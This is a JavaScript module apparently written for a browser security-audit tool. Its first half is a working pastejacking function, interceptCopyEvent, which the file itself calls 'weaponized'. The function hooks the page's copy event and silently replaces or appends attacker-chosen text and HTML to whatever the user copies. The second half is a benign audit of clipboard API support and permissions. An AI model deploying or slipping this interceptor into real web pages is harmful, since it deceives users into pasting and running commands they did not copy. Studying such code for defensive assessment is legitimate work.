/**
 * pastejack.js — Stealthy Clipboard Interception & Audit
 *
 * This module provides:
 *   1. `interceptCopyEvent()` – a weaponized function that injects malicious
 *      content into the system clipboard whenever the user copies anything.
 *      The injected payload can be a plain text string, an HTML snippet, or
 *      both, and can silently replace or append to the original copied content.
 *
 *   2. Default export – a Pinpoint‑compatible `Clipboard_API_Audit` that
 *      reports `navigator.clipboard` support, read/write method availability,
 *      and permission states for clipboard‑read and clipboard‑write.
 *
 * Designed exclusively for authorised security assessments.
 */

// ---------------------------------------------------------------------------
// 1. Clipboard payload injector via copy event interception
// ---------------------------------------------------------------------------

/**
 * Intercepts the browser’s native copy event and replaces or modifies the
 * copied data with attacker‑controlled content. The function attaches a
 * global `copy` event listener that will run every time the user copies
 * (until the listener is removed).
 *
 * **How it works:**
 *   - Listens for `copy` events on `document`.
 *   - Calls `event.clipboardData.setData()` to override what goes into the
 *     clipboard.
 *   - The original copied content is discarded unless `preserveOriginal` is
 *     set, in which case the payload is appended or prepended.
 *
 * **Usage:**
 *   ```js
 *   const stop = interceptCopyEvent({
 *       textPayload: 'echo "PWNED"',
 *       htmlPayload: '<b>PWNED</b>',
 *       preserveOriginal: false,  // completely replace what the user copied
 *   });
 *   // Later...
 *   stop();  // remove the listener and clean up
 *   ```
 *
 * @param {Object}   [options={}]
 * @param {string}   [options.textPayload]   – plain text to inject. If omitted, text is left
 *                                            unchanged (empty string means no text).
 * @param {string}   [options.htmlPayload]   – HTML payload (e.g., for pasting into rich editors).
 * @param {boolean}  [options.preserveOriginal=false] – if true, the payload is appended to the
 *                                                      original content instead of replacing it.
 * @param {boolean}  [options.allowOnce=false] – if true, the listener self‑destructs after the
 *                                               first copy event.
 * @returns {Function} a cleanup function that removes the event listener.
 */
export function interceptCopyEvent(options = {}) {
    const {
        textPayload = '',
        htmlPayload = '',
        preserveOriginal = false,
        allowOnce = false,
    } = options;

    // Valid payloads to set (we'll only call setData if the string is not undefined)
    const hasTextPayload = typeof textPayload === 'string';
    const hasHtmlPayload = typeof htmlPayload === 'string';

    // ----- Event handler -----
    function onCopy(event) {
        // Do nothing if clipboardData is unavailable (rare)
        if (!event.clipboardData) return;

        const cd = event.clipboardData;

        // If preserveOriginal is false, we clear the existing data completely
        // by calling setData on the types we intend to overwrite.
        // For types we want to replace, we just call setData.
        // For other types we might want to remove them to avoid mixing.
        // However, it's safest to clear all data and then set ours, but the spec
        // doesn't support clearing. So we'll overwrite the common types.
        // For each data type (text/plain, text/html), we'll set our payload.

        // --- Text / plain ---
        if (hasTextPayload) {
            if (preserveOriginal) {
                const originalText = cd.getData('text/plain') || '';
                cd.setData('text/plain', originalText + textPayload);
            } else {
                cd.setData('text/plain', textPayload);
            }
        }

        // --- HTML ---
        if (hasHtmlPayload) {
            if (preserveOriginal) {
                const originalHTML = cd.getData('text/html') || '';
                cd.setData('text/html', originalHTML + htmlPayload);
            } else {
                cd.setData('text/html', htmlPayload);
            }
        }

        // Optionally, we can also remove the original files (if any) to avoid
        // confusion. We can't really clear them, but we can call preventDefault?
        // No, that would stop the copy entirely. We'll just let the clipboard
        // merge our data with any other formats. That's acceptable.

        // Prevent the default copy action? No, because we need the event to
        // actually write to clipboard. But we've already modified the data so
        // it's fine.

        // If allowOnce, remove the listener after first invocation
        if (allowOnce) {
            document.removeEventListener('copy', onCopy);
        }
    }

    // Attach the listener in the capturing phase so it runs before most
    // site‑level handlers (some pages may also set copy handlers).
    document.addEventListener('copy', onCopy, true);

    // Return a cleanup function
    return function stopIntercept() {
        document.removeEventListener('copy', onCopy, true);
    };
}

// ---------------------------------------------------------------------------
// 2. Pinpoint‑compatible Clipboard_API_Audit (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'pastejack',
    title: 'Clipboard_API_Audit',
    level: 3,
    info: 'Audits navigator.clipboard support and permission states (clipboard-read, clipboard-write).',
    steps: [
        'Check navigator.clipboard existence.',
        'Query clipboard permission states via navigator.permissions.query.',
    ],
    run: async () => {
        const supported = typeof navigator.clipboard !== 'undefined';
        let readPermission = 'unknown';
        let writePermission = 'unknown';

        if (navigator.permissions && navigator.permissions.query) {
            try {
                const readStatus = await navigator.permissions.query({ name: 'clipboard-read' });
                readPermission = readStatus.state;
            } catch (e) {
                readPermission = 'not_queriable';
            }
            try {
                const writeStatus = await navigator.permissions.query({ name: 'clipboard-write' });
                writePermission = writeStatus.state;
            } catch (e) {
                writePermission = 'not_queriable';
            }
        }

        return {
            clipboardApiSupported: supported,
            readTextSupported: supported && typeof navigator.clipboard.readText === 'function',
            writeTextSupported: supported && typeof navigator.clipboard.writeText === 'function',
            permissions: {
                read: readPermission,
                write: writePermission,
            },
        };
    },
};

export default pinpointModule;